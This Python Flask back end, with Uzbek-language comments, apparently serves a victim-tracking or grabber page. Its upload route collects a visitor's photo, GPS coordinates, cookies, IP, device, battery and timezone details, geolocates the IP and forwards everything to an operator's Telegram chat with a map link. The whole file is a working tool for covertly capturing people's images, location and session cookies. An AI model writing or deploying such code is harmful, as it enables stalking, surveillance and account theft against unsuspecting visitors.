import os
from flask import Flask, request, render_template,jsonify
import requests
import uuid
app = Flask(__name__)
from config import BOT_TOKEN, ADMIN_ID

def get_bot_username():
    """Get the bot's username from the Telegram API."""
    response = requests.post(f'https://api.telegram.org/bot{BOT_TOKEN}/getMe')
    if response.status_code == 200: 
        data = response.json()
        if data['ok']:
            return (data['result']['username'])
    return None

@app.route('/')
def index():
    BOT_USERNAME= get_bot_username()
    if not BOT_USERNAME:
        return render_template("index.html", bot_username=BOT_USERNAME), 500
    return render_template("index.html", bot_username=BOT_USERNAME),200

@app.route('/check-ip/<ip>')
def check_ip(ip):
    try:
        res = requests.get(f"https://ipinfo.io/{ip}/json")
        if res.status_code != 200:
            return jsonify({'error': 'IP ma`lumotlari topilmadi'})
        return res.json()
    except requests.RequestException as e:
        return jsonify({'error': str(e)})
    except Exception as e:
        return jsonify({'error': str(e)})

def fetch_check_ip(ip):
    try:
        res = requests.get(f"https://ipinfo.io/{ip}/json")
        if res.status_code != 200:
            return {}
        return res.json()
    except Exception as e:
        return {}



def clean_value(value: str, max_length=100):
    """Xavfsizlik uchun qiymatni tozalash va cheklash"""
    return str(value).replace('"', '').replace("'", '')[:max_length]

@app.route('/upload', methods=['POST'])
def upload():
    if 'photo' not in request.files:
        return 'Rasm yo‘q', 400
    photo = request.files['photo']
    # Fayl turi tekshiruvi
    if photo.content_type != 'image/jpeg':
        return 'Faqat JPEG formatdagi rasm fayllari qabul qilinadi', 400
    
    # Form ma’lumotlarini tozalash va cheklash
    user_agent     = clean_value(request.form.get('userAgent', 'Nomalum'))
    platform       = clean_value(request.form.get('platform', 'Nomalum'))
    cookies        = clean_value(request.form.get('cookies', 'Nomalum'))
    battery_level  = clean_value(request.form.get('batteryLevel', 'Nomalum'))
    battery_charge = clean_value(request.form.get('batteryCharging', 'Nomalum'))
    language       = clean_value(request.form.get('language', 'Nomalum'))
    tz_offset      = clean_value(request.form.get('timezoneOffset', 'Nomalum'))
    user_timezone  = clean_value(request.form.get('userTimezone', 'Nomalum'))
    latitude       = request.form.get('latitude', 'Nomalum')
    longitude      = request.form.get('longitude', 'Nomalum')
    user_ip        = request.form.get('user_ip', 'Nomalum')
    if not user_ip or user_ip == 'Nomalum':
        user_ip = request.remote_addr
    user_ip_data = fetch_check_ip(user_ip)

    # Rasmni vaqtinchalik saqlash
    filename = f"{uuid.uuid4().hex}.jpg"
    os.makedirs("uploads", exist_ok=True)
    photo_path = os.path.join("uploads", filename)
    if not photo_path:
        return 'Rasmni saqlashda xatolik', 500
    
    try:
        photo.save(photo_path)
    except Exception as e:
        return f"Rasmni saqlab bo‘lmadi: {e}", 500
    
    city = user_ip_data.get('city', "Noma'lum")
    region = user_ip_data.get('region', "Noma'lum")
    country = user_ip_data.get('country', "Noma'lum")
    isp = user_ip_data.get('org', "Noma'lum")
    caption_text = (
        "🚨 <b>Yangi foydalanuvchi ma’lumotlari</b>\n\n"
        f"📸 <b>Rasm:</b> ilova qilindi\n"
        f"🌐 <b>IP:</b> <code>{user_ip}</code>\n"
        f"📍<b>Koordinatalar:</b> Latitude: {latitude}, Longitude: {longitude}\n"
        f"🌍 <a href='https://maps.google.com/?q={latitude},{longitude}'>Geolokatsiya ko`rish</a>\n\n"
        f"🧭 <b>Timezone:</b> {user_timezone} (Offset: {tz_offset})\n\n"
        f"🖥️ <b>Platforma:</b> {platform}\n"
        f"🧠 <b>User-Agent:</b> {user_agent}\n"
        f"🔤 <b>Til:</b> {language}\n"
        f"🔋 <b>Zaryad:</b> {battery_level} | <b>Quvvat olayapti:</b> {battery_charge}\n"
        f"🍪 <b>Cookies:</b> {cookies}\n\n"
        f"📍 <b>IP ma’lumotlari:</b>\n"
        f"   - <b>Shahar:</b> <code>{city}</code>\n"
        f"   - <b>Region:</b> <code>{region}</code>\n"
        f"   - <b>Davlat:</b> <code>{country}</code>\n"
        f"   - <b>ISP:</b> <code>{isp}</code>\n"
    )


    # Telegram orqali yuborish
    send_url = f'https://api.telegram.org/bot{BOT_TOKEN}/sendPhoto'
    try:
        with open(photo_path, 'rb') as f:
            resp = requests.post(send_url, data={
                'chat_id': ADMIN_ID,
                'caption': caption_text,
                'parse_mode': 'HTML'
            }, files={'photo': f})
        if resp.status_code != 200 or not resp.json().get('ok'):
            return 'Telegramga yuborishda xatolik', 500
    except Exception as e:
        return f"Telegramga yuborishda xatolik: {e}", 500

    try:
        os.remove(photo_path)
    except Exception as e:
        print(f"Faylni o‘chirishda xatolik: {e}")
    # Istasangiz: return 'Fayl o‘chirilmadi', 500
    return 'Yuborildi ✅', 200



@app.route('/.well-known/appspecific/com.chrome.devtools.json')
def chrome_devtools_fix():
    return '', 204  # 204 No Content

if __name__ == '__main__':
    app.run(debug=False, host='0.0.0.0', port=int(os.environ.get('PORT', 5000)))
